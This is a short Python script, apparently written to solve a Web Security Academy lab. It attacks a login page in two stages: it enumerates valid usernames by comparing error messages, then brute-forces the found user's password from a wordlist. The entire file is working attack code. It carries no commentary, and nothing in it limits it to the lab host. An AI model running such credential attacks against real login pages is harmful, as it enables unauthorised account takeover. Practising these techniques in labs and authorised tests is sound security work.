import requests

url = 'https://0aff00b004472c0481bdcf3b0008004e.web-security-academy.net/login'
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

with open('wordlist_user.txt', 'r') as arquivo_user:
    list_user = arquivo_user.read().splitlines()

for i in range(len(list_user)):
    data = {
        "username": list_user[i],
        "password": "123456"
    }
    response = requests.post(url, headers=headers, data=data)
    
    if "Invalid username or password." in response.text:
        pass
    else:
        print(list_user[i])
        username = list_user[i]

with open('wordlist_pass.txt', 'r') as arquivo_pass:
    list_pass = arquivo_pass.read().splitlines()
    
for i in range(len(list_pass)):
    data = {
        "username": username,
        "password": list_pass[i]
    }
    response = requests.post(url, headers=headers, data=data)
    
    if "Invalid username or password" in response.text:
        pass
    else:
        print(list_pass[i])